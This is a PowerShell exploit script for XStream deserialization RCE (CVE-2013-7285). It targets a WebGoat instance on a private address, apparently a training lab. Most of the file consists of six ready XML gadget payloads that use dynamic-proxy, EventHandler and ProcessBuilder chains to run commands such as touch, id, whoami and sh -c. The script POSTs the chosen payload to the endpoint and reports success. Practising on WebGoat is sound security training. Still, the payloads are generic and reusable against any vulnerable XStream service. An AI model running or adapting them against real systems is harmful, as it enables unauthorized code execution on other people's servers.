# XStream CVE-2013-7285 Exploit
# PowerShell automation script

Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "  CVE-2013-7285 - XStream Deserialization RCE" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

$webgoatUrl = "http://192.168.254.112:8001/WebGoat/vulnerable-components/XStream"

# Payload selection
Write-Host "Available Payloads:" -ForegroundColor Yellow
Write-Host ""
Write-Host "1. Touch file - /tmp/pwned" -ForegroundColor White
Write-Host "2. Execute 'id' command" -ForegroundColor White
Write-Host "3. Contact with embedded exploit" -ForegroundColor White
Write-Host "4. Simplified dynamic proxy" -ForegroundColor White
Write-Host "5. Execute 'whoami'" -ForegroundColor White
Write-Host "6. Echo to file" -ForegroundColor White
Write-Host ""

$choice = Read-Host "Select payload (1-6) or press Enter for payload 1"
if ([string]::IsNullOrWhiteSpace($choice)) { $choice = "1" }

# Define payloads
$payloads = @{
    "1" = @"
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>touch</string>
          <string>/tmp/pwned</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
"@

    "2" = @"
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>id</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
"@

    "3" = @"
<contact>
  <id>999</id>
  <firstName>
    <sorted-set>
      <string>foo</string>
      <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
          <target class="java.lang.ProcessBuilder">
            <command>
              <string>whoami</string>
            </command>
          </target>
          <action>start</action>
        </handler>
      </dynamic-proxy>
    </sorted-set>
  </firstName>
  <lastName>Exploit</lastName>
  <email>exploit@test.com</email>
</contact>
"@

    "4" = @"
<contact class="dynamic-proxy">
  <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
  <handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
      <command>
        <string>touch</string>
        <string>/tmp/webgoat_pwned</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
"@

    "5" = @"
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>whoami</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
"@

    "6" = @"
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>sh</string>
          <string>-c</string>
          <string>echo WebGoat Exploited! > /tmp/exploit_proof.txt</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
"@
}

if (-not $payloads.ContainsKey($choice)) {
    Write-Host "Invalid choice. Using payload 1." -ForegroundColor Yellow
    $choice = "1"
}

$payload = $payloads[$choice]

Write-Host ""
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Selected Payload:" -ForegroundColor Green
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host $payload -ForegroundColor Gray
Write-Host ""

# Test normal contact first
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Step 1: Testing with Normal Contact" -ForegroundColor Yellow
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

$normalContact = @"
<contact>
    <id>1</id>
    <firstName>Bruce</firstName>
    <lastName>Mayhew</lastName>
    <email>webgoat@owasp.org</email>
</contact>
"@

try {
    Write-Host "Sending normal contact..." -ForegroundColor White
    $response = Invoke-WebRequest -Uri $webgoatUrl -Method POST `
        -ContentType "application/xml" `
        -Body $normalContact `
        -UseBasicParsing
    
    Write-Host "‚úÖ Normal contact response:" -ForegroundColor Green
    Write-Host $response.Content -ForegroundColor Gray
    Write-Host ""
} catch {
    Write-Host "‚ùå Error with normal contact:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
    Write-Host ""
}

# Send exploit
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "Step 2: Sending Exploit Payload" -ForegroundColor Red
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""

try {
    Write-Host "üöÄ Sending exploit..." -ForegroundColor Yellow
    $response = Invoke-WebRequest -Uri $webgoatUrl -Method POST `
        -ContentType "application/xml" `
        -Body $payload `
        -UseBasicParsing
    
    Write-Host "‚úÖ Exploit sent successfully!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Status Code: $($response.StatusCode)" -ForegroundColor White
    Write-Host "Response:" -ForegroundColor White
    Write-Host $response.Content -ForegroundColor Gray
    Write-Host ""
    
    if ($response.StatusCode -eq 200) {
        Write-Host "üí• EXPLOIT SUCCESSFUL!" -ForegroundColor Green
        Write-Host "Command should have executed on the server" -ForegroundColor Yellow
    }
    
} catch {
    Write-Host "‚ùå Exploit failed:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
    
    if ($_.Exception.Response) {
        $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        $responseBody = $reader.ReadToEnd()
        Write-Host "Response:" -ForegroundColor White
        Write-Host $responseBody -ForegroundColor Gray
    }
}

Write-Host ""
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "How to Verify Exploit:" -ForegroundColor Yellow
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "If you have access to the Docker container:" -ForegroundColor White
Write-Host "  docker exec -it <container> bash" -ForegroundColor Gray
Write-Host "  ls -la /tmp/pwned" -ForegroundColor Gray
Write-Host "  cat /tmp/exploit_proof.txt" -ForegroundColor Gray
Write-Host ""
Write-Host "Or check if WebGoat accepted the payload without errors" -ForegroundColor White
Write-Host ""
